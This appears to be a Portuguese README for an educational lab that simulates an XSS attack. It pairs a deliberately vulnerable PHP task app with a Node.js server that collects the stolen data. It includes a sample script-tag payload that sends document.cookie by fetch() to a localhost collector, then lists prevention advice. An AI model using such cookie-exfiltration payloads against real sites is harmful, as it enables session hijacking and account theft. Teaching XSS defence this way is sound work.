# Simular Ataque XSS

Este projeto é uma demonstração prática de como um **ataque XSS (Cross-Site Scripting)** pode capturar dados sensíveis, como informações de usuários, por meio de vulnerabilidades em aplicações web. Ele é composto por dois servidores:

1. **Servidor Base**: Simula uma aplicação vulnerável que permite o cadastro de usuários, login e a adição de tarefas.
2. **Servidor de Banco**: Um servidor que coleta informações enviadas por meio de requisições maliciosas (simulação de ataque).

---

## Requisitos

- **XAMPP** ou **WAMP Server** (para configurar o Servidor Base)
- **Node.js** (para rodar o Servidor de Banco)
- Navegador para acessar o localhost

---

## Estrutura do Projeto

```
Simular_Ataque_XSS/
├── Servidor_Base/
│   ├── database.php        # Configuração do banco de dados para o sistema de tarefas
│   ├── index.php           # Página inicial com listagem de tarefas
│   ├── login.php           # Página de login
│   ├── logout.php          # Gerencia a saída do usuário
│   ├── register.php        # Página de registro de novos usuários
├── Servidor_de_Banco/
│   ├── coleta.js           # Servidor Node.js para capturar informações via POST
│   ├── dados.txt           # Arquivo onde os dados coletados são armazenados
│   ├── package.json        # Configurações do Node.js
│   ├── package-lock.json   # Dependências do Node.js
│   ├── Script_de_Ataque.js # Simulação de ataque XSS
```

---

## Configuração do Projeto

### **1. Configurar o Servidor Base**

1. Certifique-se de que o **XAMPP** ou **WAMP Server** está instalado.
2. Copie a pasta `Servidor_Base` para o diretório **raiz do servidor web**:
   - **XAMPP:** Cole a pasta em `C:\xampp\htdocs`.
   - **WAMP:** Cole a pasta em `C:\wamp\www`.
3. Inicie o servidor web:
   - **XAMPP:** Abra o painel de controle do XAMPP e inicie o **Apache**.
   - **WAMP Server:** Clique no ícone do WAMP no tray e selecione "Start All Services".
4. No navegador, acesse `http://localhost/Servidor_Base/`.

Agora você poderá interagir com a aplicação web.

---

### **2. Configurar o Servidor de Banco**

1. Certifique-se de que o **Node.js** está instalado na sua máquina.
2. Navegue até a pasta `Servidor_de_Banco` no terminal:
   ```bash
   cd Servidor_de_Banco
   ```
3. Instale as dependências necessárias:
   ```bash
   npm install
   ```
4. Inicie o servidor:
   ```bash
   node coleta.js
   ```
5. O servidor estará rodando em `http://localhost:4000/`.

---

## Como Funciona

### **Passo 1: Registrar um Usuário**
1. Acesse `http://localhost/Servidor_Base/register.php`.
2. Cadastre um novo usuário com nome, email e senha.
3. Faça login na aplicação.

### **Passo 2: Adicionar Tarefas**
1. Após o login, você será redirecionado para a página principal (`index.php`).
2. Adicione algumas tarefas para simular dados no sistema.

### **Passo 3: Executar o Script de Ataque**
1. Edite o arquivo `Script_de_Ataque.js` em `Servidor_de_Banco` (se necessário).
2. O script captura os cookies do navegador e envia para o **Servidor de Banco**.
3. Rode o script em um ambiente onde a aplicação esteja carregada.

### **Passo 4: Visualizar os Dados Roubados**
1. No terminal onde o servidor `coleta.js` está rodando, os dados capturados serão salvos no arquivo `dados.txt`.
2. Abra o arquivo `dados.txt` para visualizar as informações (como cookies ou outras informações sensíveis).

---

## Exemplo de Requisição Maliciosa

O arquivo `Script_de_Ataque.js` pode conter um código semelhante ao abaixo para simular o ataque:

```javascript
<script>
  fetch('http://localhost:4000/collect',
    { method: 'POST', headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ cookies: document.cookie })
  });
</script>

```

Esse código é executado no navegador da vítima e envia os cookies da sessão para o Servidor de Banco (`http://localhost:4000/`).

---

## Importante

Este projeto foi criado **apenas para fins educacionais** e demonstra como proteger sistemas contra ataques XSS. Não utilize este conhecimento para fins maliciosos.

### **Como Prevenir Ataques XSS**
- **Sanitize as entradas de usuário:** Use funções como `htmlspecialchars()` no PHP para escapar caracteres perigosos.
- **Valide todas as entradas:** Certifique-se de que os dados do usuário não contêm scripts ou código malicioso.
- **Utilize CSP (Content Security Policy):** Restrinja a execução de scripts desconhecidos no navegador.
- **Escapando Saídas:** Nunca confie em dados enviados por usuários antes de exibi-los.

---

### Licença

Este projeto é distribuído sob a licença [MIT](https://opensource.org/licenses/MIT). Sinta-se livre para modificá-lo e usá-lo, mas sempre com ética e responsabilidade.
